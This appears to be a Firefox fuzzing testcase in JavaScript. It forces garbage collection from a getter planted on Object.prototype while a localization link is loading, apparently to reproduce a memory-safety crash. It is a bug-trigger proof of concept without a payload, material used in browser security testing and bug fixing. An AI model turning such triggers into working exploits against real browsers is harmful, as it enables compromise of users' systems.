forceGC = () => {
   FuzzingFunctions.garbageCollect();
   FuzzingFunctions.cycleCollect();
   //new ArrayBuffer(0xfffffff);
   //alert(1);
}
document.documentElement.setAttribute("data-l10n-sync","");
var link = document.body.appendChild(document.createElement("link"))
Object.prototype.__defineGetter__("then", function() {
 link.rel = "";
 forceGC();
})
function run(){
  link.rel = "localization"
}
setTimeout(run,1000);